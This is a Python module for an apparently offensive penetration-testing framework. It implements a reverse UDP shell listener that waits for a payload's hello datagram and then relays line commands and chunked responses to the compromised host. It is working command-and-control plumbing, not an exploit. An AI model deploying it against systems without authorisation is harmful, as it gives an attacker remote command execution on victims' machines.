#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Reverse UDP listener with a socket-like wrapper for ClassicShell."""

from __future__ import annotations

import socket
import threading
import time
from typing import Tuple

from kittysploit import *


class UdpSessionSocket:
	"""Present a connected-style API over UDP for ClassicShell (sendall/recv)."""

	def __init__(self, sock: socket.socket, peer: Tuple[str, int]):
		self._sock = sock
		self._peer = peer
		self._buf = bytearray()
		self._lock = threading.Lock()
		self._timeout = 30.0
		self._closed = False
		self._cv = threading.Condition(self._lock)
		self._recv_thread = threading.Thread(target=self._pump, daemon=True)
		self._recv_thread.start()

	def _pump(self):
		self._sock.settimeout(0.5)
		while not self._closed:
			try:
				data, addr = self._sock.recvfrom(65535)
			except socket.timeout:
				continue
			except OSError:
				break
			if addr[0] != self._peer[0]:
				continue
			self._peer = (self._peer[0], addr[1])
			with self._cv:
				self._buf.extend(data)
				self._cv.notify_all()

	def sendall(self, data):
		if isinstance(data, str):
			data = data.encode("utf-8", errors="replace")
		if self._closed:
			raise BrokenPipeError("UDP session closed")
		# Ensure command ends with newline for PowerShell line-oriented agents
		if data and not data.endswith(b"\n"):
			data += b"\n"
		ofs = 0
		while ofs < len(data):
			n = min(1200, len(data) - ofs)
			self._sock.sendto(data[ofs : ofs + n], self._peer)
			ofs += n

	def recv(self, bufsize: int) -> bytes:
		deadline = time.time() + (self._timeout or 30.0)
		with self._cv:
			while not self._buf and not self._closed:
				remaining = deadline - time.time()
				if remaining <= 0:
					raise socket.timeout("UDP recv timeout")
				self._cv.wait(timeout=min(0.5, remaining))
			if not self._buf:
				raise socket.timeout("UDP recv timeout")
			chunk = bytes(self._buf[:bufsize])
			del self._buf[:bufsize]
			return chunk

	def settimeout(self, timeout):
		self._timeout = float(timeout) if timeout else 30.0

	def close(self):
		self._closed = True
		with self._cv:
			self._cv.notify_all()
		try:
			self._sock.close()
		except OSError:
			pass


class Module(Listener):
	__info__ = {
		"name": "Reverse UDP Listener",
		"description": (
			"UDP reverse shell listener (one session at a time). Waits for KS_UDP_HELLO, "
			"then exchanges line commands with chunked responses."
		),
		"handler": Handler.REVERSE,
		"session_type": SessionType.SHELL,
	}

	lhost = OptString("0.0.0.0", "Local bind address", True)
	lport = OptPort(4444, "Local UDP port", True)

	def run(self):
		try:
			print_status(f"Starting UDP server on {self.lhost}:{self.lport}")
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			sock.bind((str(self.lhost), int(self.lport)))
			sock.settimeout(1.0)
			self.sock = sock
			print_success(f"UDP listening on {self.lhost}:{self.lport}")
			print_info("Waiting for KS_UDP_HELLO from payload...")

			while not self.stop_flag.is_set():
				try:
					data, addr = sock.recvfrom(65535)
				except socket.timeout:
					continue
				except KeyboardInterrupt:
					return False

				text = data.decode("utf-8", errors="replace")
				if "KS_UDP_HELLO" in text:
					print_success(f"UDP hello from {addr[0]}:{addr[1]}")
				else:
					print_warning(f"First datagram from {addr[0]}:{addr[1]} (no hello) — binding peer")

				wrapper = UdpSessionSocket(sock, addr)
				self.sock = None  # ownership transferred; listener run returns one session
				return (
					wrapper,
					addr[0],
					addr[1],
					{
						"connection_type": "reverse",
						"protocol": "udp",
						"stager_line_mode": True,
					},
				)

			return False
		except KeyboardInterrupt:
			return False
		except OSError as e:
			print_error(f"UDP listener error: {e}")
			return False

	def shutdown(self):
		try:
			if hasattr(self, "sock") and self.sock:
				self.sock.close()
		except OSError:
			pass
